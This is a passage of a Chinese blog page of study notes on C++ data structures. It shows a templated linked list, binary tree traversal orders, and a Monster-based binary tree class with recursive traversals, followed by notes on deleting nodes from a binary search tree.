class=\"line\">\t<span class=\"keyword\">return</span> SUCCESS;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">DWORD LinkList&lt;T&gt;::<span class=\"built_in\">GetSize</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDWORD size = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tPNODE ptempNode = m_pList;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (ptempNode != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tptempNode = ptempNode-&gt;pNext;</span><br><span class=\"line\">\t\tsize++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> size;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\"><span class=\"type\">void</span> LinkList&lt;T&gt;::<span class=\"built_in\">Print</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tPNODE pTempNode = m_pList;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (DWORD i = <span class=\"number\">0</span>; i &lt; m_dwLength; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>, pTempNode-&gt;Data);</span><br><span class=\"line\">\t\tpTempNode = pTempNode-&gt;pNext;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//LinkList&lt;int&gt; Link;</span></span><br><span class=\"line\">\t<span class=\"comment\">//Link.Insert(0,9);</span></span><br><span class=\"line\">\t<span class=\"comment\">//Link.Insert(1,8);</span></span><br><span class=\"line\">\t<span class=\"comment\">//Link.Insert(7);</span></span><br><span class=\"line\">\t<span class=\"comment\">//Link.Insert(6);</span></span><br><span class=\"line\">\t<span class=\"comment\">//9 8 7 6</span></span><br><span class=\"line\">\t<span class=\"comment\">//int x = 6;</span></span><br><span class=\"line\">\t<span class=\"comment\">//cout &lt;&lt; Link.GetElementIndex(x) &lt;&lt; &quot;\\n&quot;;</span></span><br><span class=\"line\">\t<span class=\"comment\">//cout &lt;&lt; Link.GetSize() &lt;&lt; &quot;\\n&quot;;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//int w;</span></span><br><span class=\"line\">\t<span class=\"comment\">//Link.GetElement(3,w);</span></span><br><span class=\"line\">\t<span class=\"comment\">//cout &lt;&lt; w &lt;&lt; &quot;\\n&quot;;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//Link.Delete(2);</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//Link.Print();</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//Link.Delete(0);</span></span><br><span class=\"line\">\t<span class=\"comment\">//Link.Print();</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//bool haha = IsEmpty();</span></span><br><span class=\"line\">\t<span class=\"comment\">//if(haha == true) cout &lt;&lt; &quot;empty\\n&quot;;</span></span><br><span class=\"line\">\t<span class=\"comment\">//else cout &lt;&lt; &quot;not empty\\n&quot;;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//Link.clear();</span></span><br><span class=\"line\">\t<span class=\"comment\">//Link.Print();</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tLinkList&lt;<span class=\"type\">int</span>&gt;* shabi = <span class=\"keyword\">new</span> LinkList&lt;<span class=\"type\">int</span>&gt;;</span><br><span class=\"line\">\tshabi-&gt;<span class=\"built_in\">Insert</span>(<span class=\"number\">0</span>,<span class=\"number\">9</span>);</span><br><span class=\"line\">\tshabi-&gt;<span class=\"built_in\">Insert</span>(<span class=\"number\">1</span>,<span class=\"number\">8</span>);</span><br><span class=\"line\">\tshabi-&gt;<span class=\"built_in\">Insert</span>(<span class=\"number\">7</span>);</span><br><span class=\"line\">\tshabi-&gt;<span class=\"built_in\">Insert</span>(<span class=\"number\">6</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//shabi-&gt;Print();</span></span><br><span class=\"line\">\tcout &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">\tshabi-&gt;<span class=\"built_in\">Delete</span>(<span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"comment\">//shabi-&gt;Print();</span></span><br><span class=\"line\">\tcout &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tshabi-&gt;<span class=\"built_in\">clear</span>();</span><br><span class=\"line\">\t<span class=\"comment\">//shabi-&gt;Print();</span></span><br><span class=\"line\">\tcout &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Hello World!\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZXNpb24uY29tL2FydGljbGUvNzk3MzU0MDgzOC8=\">滴水逆向 ——C++_链表 - 灰信网（软件开发博客聚合） (freesion.com)</span></p>\n<h3 id=\"二叉树\"><a class=\"markdownIt-Anchor\" href=\"#二叉树\">#</a> 二叉树</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230307171158951.png\" alt=\"image-20230307171158951\"></p>\n<p>前序遍历</p>\n<p>​\t根左右</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">G D A F E M H Z</span><br></pre></td></tr></table></figure>\n<p>中序遍历</p>\n<p>​\t左根右</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>后序遍历</p>\n<p>​\t左右根</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230307171937417.png\" alt=\"image-20230307171937417\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;windows.h&quot;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &quot;stdlib.h&quot;</span><br><span class=\"line\">#include &quot;malloc.h&quot;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">#define SUCCESS           \t\t\t  1 // 执行成功\t</span><br><span class=\"line\">#define ERRORR\t\t\t\t\t\t -1 // 执行失败\t</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//基础怪物模板</span><br><span class=\"line\">class Monster &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">public:</span><br><span class=\"line\">\tint Id;  //怪物编号</span><br><span class=\"line\">\tchar Name[20];//名字</span><br><span class=\"line\">\tint Level;//等级</span><br><span class=\"line\">public:</span><br><span class=\"line\">\tMonster() &#123;&#125;;//构造 ,默认怪物</span><br><span class=\"line\">\tMonster(int Id, char* Name, int Level);   //怪物参数</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Monster::Monster(int Id, char* Name, int Level) </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tthis-&gt;Id = Id;</span><br><span class=\"line\">\tthis-&gt;Level = Level;</span><br><span class=\"line\">\tmemcpy(&amp;this-&gt;Name, Name, strlen(Name) + 1);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">template&lt;class T&gt;</span><br><span class=\"line\">class TreeNode &#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">\tT element; //节点数据</span><br><span class=\"line\">\tTreeNode&lt;T&gt;* pLeft; //左树指针</span><br><span class=\"line\">\tTreeNode&lt;T&gt;* pRight;//右树指针</span><br><span class=\"line\"></span><br><span class=\"line\">\tTreeNode(T&amp; ele) &#123;</span><br><span class=\"line\">\t\t//初始化node节点</span><br><span class=\"line\">\t\tmemset(&amp;element, 0, sizeof(TreeNode));</span><br><span class=\"line\">\t\t//为元素复制</span><br><span class=\"line\">\t\tmemcpy(&amp;element, &amp;ele, sizeof(T));</span><br><span class=\"line\">\t\tpLeft = pRight = NULL;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">template&lt;class T&gt;</span><br><span class=\"line\">class BsortTree &#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">\tBsortTree();</span><br><span class=\"line\">\t~BsortTree();</span><br><span class=\"line\">public:</span><br><span class=\"line\">\tvoid InOrderTraverse(TreeNode&lt;T&gt;* pNode); //中序遍历</span><br><span class=\"line\">\tvoid PreOrderTraverse(TreeNode&lt;T&gt;* pNode);//前序遍历</span><br><span class=\"line\">\tvoid PostOrderTraverse(TreeNode&lt;T&gt;* pNode);//后序遍历</span><br><span class=\"line\">\tTreeNode&lt;T&gt;* GetRoot();//返回根节点</span><br><span class=\"line\">\tint GetDepth(TreeNode&lt;T&gt;* Node);// 返回当前节点高度</span><br><span class=\"line\"></span><br><span class=\"line\">private:</span><br><span class=\"line\">\tvoid Init();//初始化一些数值</span><br><span class=\"line\">\tvoid Destroy(TreeNode&lt;T&gt;* Node);</span><br><span class=\"line\">private:</span><br><span class=\"line\">\tTreeNode&lt;T&gt;* pRootNode; //根节点指针</span><br><span class=\"line\">\tint size;//树中元素总数</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">template&lt;class T&gt;</span><br><span class=\"line\">void BsortTree&lt;T&gt;::Init()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tMonster m1(1, (char*)&quot;AAA&quot;, 50);</span><br><span class=\"line\">\tMonster m2(2, (char*)&quot;BBB&quot;, 100);</span><br><span class=\"line\">\tMonster m3(3, (char*)&quot;CCC&quot;, 74);</span><br><span class=\"line\">\tMonster m4(4, (char*)&quot;DDD&quot;, 56);</span><br><span class=\"line\">\tMonster m5(5, (char*)&quot;EEE&quot;, 88);</span><br><span class=\"line\">\tMonster m6(6, (char*)&quot;FFF&quot;, 999);</span><br><span class=\"line\">\tMonster m7(7, (char*)&quot;GGG&quot;, 7);</span><br><span class=\"line\">\tTreeNode&lt;Monster&gt;* n1 = new TreeNode&lt;Monster&gt;(m1);</span><br><span class=\"line\">\tTreeNode&lt;Monster&gt;* n2 = new TreeNode&lt;Monster&gt;(m2);</span><br><span class=\"line\">\tTreeNode&lt;Monster&gt;* n3 = new TreeNode&lt;Monster&gt;(m3);</span><br><span class=\"line\">\tTreeNode&lt;Monster&gt;* n4 = new TreeNode&lt;Monster&gt;(m4);</span><br><span class=\"line\">\tTreeNode&lt;Monster&gt;* n5 = new TreeNode&lt;Monster&gt;(m5);</span><br><span class=\"line\">\tTreeNode&lt;Monster&gt;* n6 = new TreeNode&lt;Monster&gt;(m6);</span><br><span class=\"line\">\tTreeNode&lt;Monster&gt;* n7 = new TreeNode&lt;Monster&gt;(m7);</span><br><span class=\"line\"></span><br><span class=\"line\">\tpRootNode = n5;</span><br><span class=\"line\">\tn5-&gt;pLeft = n4;</span><br><span class=\"line\">\tn5-&gt;pRight = n6;</span><br><span class=\"line\">\tn4-&gt;pLeft = n1;</span><br><span class=\"line\">\tn1-&gt;pRight = n2;</span><br><span class=\"line\">\tn6-&gt;pLeft = n3;</span><br><span class=\"line\">\tn3-&gt;pRight = n7;</span><br><span class=\"line\">\tsize = 7;</span><br><span class=\"line\">\t\t//\t\t\t\t\t\t5</span><br><span class=\"line\">\t\t//\t\t\t4\t\t\t\t\t\t\t\t\t6</span><br><span class=\"line\">\t\t//1\t\t\t\t\t\t\t\t\t3</span><br><span class=\"line\">\t\t//\t\t2\t\t\t\t\t\t\t\t\t7</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">template&lt;class T&gt;</span><br><span class=\"line\">void BsortTree&lt;T&gt;::Destroy(TreeNode&lt;T&gt;* pNode)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tif (pNode == NULL)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tDestroy(pNode-&gt;pLeft);</span><br><span class=\"line\">\t\tDestroy(pNode-&gt;pRight);</span><br><span class=\"line\">\t\tdelete pNode;</span><br><span class=\"line\">\t\tpNode = NULL;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">template&lt;class T&gt;</span><br><span class=\"line\">BsortTree&lt;T&gt;::BsortTree() &#123;</span><br><span class=\"line\">\tInit();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">template&lt;class T&gt;</span><br><span class=\"line\">BsortTree&lt;T&gt;::~BsortTree()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t//释放所有节点空间</span><br><span class=\"line\">\tDestroy(pRootNode);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 返回当前节点高度Node</span><br><span class=\"line\">template&lt;class T&gt;</span><br><span class=\"line\">int BsortTree&lt;T&gt;::GetDepth(TreeNode&lt;T&gt;* Node) &#123;</span><br><span class=\"line\">\tif (Node == NULL) &#123;</span><br><span class=\"line\">\t\treturn 0;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tint Left = GetDepth(Node-&gt;pLeft);</span><br><span class=\"line\">\t\tint Right = GetDepth(Node-&gt;pRight);</span><br><span class=\"line\">\t\treturn (Left &gt; Right) ? (Left + 1) : (Right + 1);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//获取根节点</span><br><span class=\"line\">template&lt;class T&gt;</span><br><span class=\"line\">TreeNode&lt;T&gt;* BsortTree&lt;T&gt;::GetRoot() </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\treturn pRootNode;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//中序遍历</span><br><span class=\"line\">template&lt;class T&gt;</span><br><span class=\"line\">void BsortTree&lt;T&gt;::InOrderTraverse(TreeNode&lt;T&gt;* pNode) </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t//列出怪的名字</span><br><span class=\"line\">\tif (pNode == NULL)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tInOrderTraverse(pNode-&gt;pLeft);</span><br><span class=\"line\">\tcout &lt;&lt; pNode-&gt;element.Name &lt;&lt; &quot;\\n&quot;;</span><br><span class=\"line\">\tInOrderTraverse(pNode-&gt;pRight);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//前序遍历</span><br><span class=\"line\">template&lt;class T&gt;//前序遍历</span><br><span class=\"line\">void BsortTree&lt;T&gt;::PreOrderTraverse(TreeNode&lt;T&gt;* pNode) </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tif (pNode == NULL)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tcout &lt;&lt; pNode-&gt;element.Name &lt;&lt; &quot;\\n&quot;;</span><br><span class=\"line\">\tPreOrderTraverse(pNode-&gt;pLeft);</span><br><span class=\"line\">\tPreOrderTraverse(pNode-&gt;pRight);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//后序遍历</span><br><span class=\"line\">template&lt;class T&gt;</span><br><span class=\"line\">void BsortTree&lt;T&gt;::PostOrderTraverse(TreeNode&lt;T&gt;* pNode) </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tif (pNode == NULL)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tPostOrderTraverse(pNode-&gt;pLeft);</span><br><span class=\"line\">\tPostOrderTraverse(pNode-&gt;pRight);</span><br><span class=\"line\">\tcout &lt;&lt; pNode-&gt;element.Name &lt;&lt; &quot;\\n&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void test()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tBsortTree&lt;Monster&gt;* p = new BsortTree&lt;Monster&gt;();</span><br><span class=\"line\">\tp-&gt;InOrderTraverse(p-&gt;GetRoot());</span><br><span class=\"line\">\tp-&gt;PostOrderTraverse(p-&gt;GetRoot());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\ttest();</span><br><span class=\"line\">    std::cout &lt;&lt; &quot;Hello World!\\n&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjQwODgzMi9hcnRpY2xlL2RldGFpbHMvMTE2NDY2MTM3\">(58 条消息) 滴水二叉树实现详细注释_wow. 的博客 - CSDN 博客</span></p>\n<p>搜索二叉树</p>\n<p>1. 有很好的查询性能</p>\n<p>2. 有很好的新增和删除性能</p>\n<p>3. 若左子树不空，则左子树上所有结点的值均小于它的根结点的值</p>\n<p>即 左小右大</p>\n<p>搜索二叉树中序遍历后就是排序后的结果</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230308170011973.png\" alt=\"image-20230308170011973\"></p>\n<p>删除叶子节点，直接删</p>\n<p>删除节点只有一个子树，直接把下面节点提上去</p>\n<p>既有左也有右，用右子树最小节点取代原节点，递归删除最小节点   、 或者左边最大</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span 